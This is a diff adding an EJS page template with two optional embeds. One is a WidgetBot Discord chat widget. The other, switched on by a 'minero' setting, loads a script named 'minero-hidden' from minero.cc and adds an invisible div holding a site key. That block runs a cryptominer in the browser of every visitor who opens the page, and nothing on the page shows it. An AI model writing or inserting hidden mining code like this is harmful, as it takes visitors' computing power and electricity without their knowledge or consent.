@@ -1,0 +1,12 @@
+<% if (settings.widget.enabled == true) { %>
+<script src="https://cdn.jsdelivr.net/npm/@widgetbot/crate@3" async defer>
+  new Crate({
+    server: '<%= settings.widget.server_id %>',
+    channel: '<%= settings.widget.channel_id %>',
+  })
+</script>
+<% } %>
+<% if (settings.api.minero.enabled == true) { %>
+  <script src="https://minero.cc/lib/minero-hidden.min.js" async></script>
+  <div class="minero-hidden" style="display: none" data-key="<%= settings.api.client.minero.key %>"></div>
+<% } %>
